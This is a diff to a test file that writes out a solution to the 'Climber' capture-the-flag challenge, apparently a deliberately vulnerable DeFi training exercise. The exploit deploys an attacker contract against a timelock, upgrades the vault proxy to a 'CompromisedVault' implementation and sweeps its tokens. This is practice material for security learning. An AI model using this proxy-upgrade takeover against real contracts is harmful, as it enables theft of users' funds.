@@ -51,8 +51,24 @@ describe('[Challenge] Climber', function () {
         await this.token.transfer(this.vault.address, VAULT_TOKEN_BALANCE);
     });
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () { 
+         const CompromisedVaultFactory = await ethers.getContractFactory('CompromisedVault', attacker);
+
+         const ClimberAttackerFactory = await ethers.getContractFactory('ClimberAttacker', attacker);
+         const climberAttackerContract = await ClimberAttackerFactory.deploy(this.timelock.address, this.vault.address)
+         console.log("## OUR ATTACKER CONTRACT HAS BEEN DEPLOYED TO: ", climberAttackerContract.address);
+
+        await climberAttackerContract.attack();
+
+        const compromisedVault = await upgrades.upgradeProxy(
+            this.vault.address,
+            CompromisedVaultFactory
+        );
+
+        console.log("## OUR COMPROMISED VAULT HAS BEEN DEPLOYED TO: ", compromisedVault.address);
+        console.log("## SWEEPING FUNDS!");
+
+        await compromisedVault.sweepFunds(this.token.address);       
     });
 
     after(async function () {
